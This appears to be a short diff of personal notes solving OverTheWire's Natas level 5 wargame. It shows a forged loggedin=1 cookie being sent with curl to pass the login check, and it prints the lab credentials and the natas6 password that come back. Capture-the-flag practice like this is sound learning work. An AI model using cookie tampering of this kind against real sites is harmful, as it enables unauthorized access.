@@ -1,0 +1,10 @@
+console.log(document.cookie)
+VM99:1 _ga=GA1.1.870408197.1738179418; loggedin=0; _ga_RD0K2239G0=GS1.1.1738433894.10.1.1738433896.0.0.0
+
+document.cookie = '_ga=GA1.1.870408197.1738179418; loggedin=1; _ga_RD0K2239G0=GS1.1.1738433894.10.1.1738433896.0.0.0'
+# This sets cookie locally but cookie doesn't get sent to tht erver that server can authorize the request
+
+curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -b '_ga=GA1.1.870408197.1738179418; loggedin=1; _ga_RD0K2239G0=GS1.1.1738433894.10.1.1738433896.0.0.0' http://natas5.natas.labs.overthewire.org/index.php
+
+<div id="content">
+Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
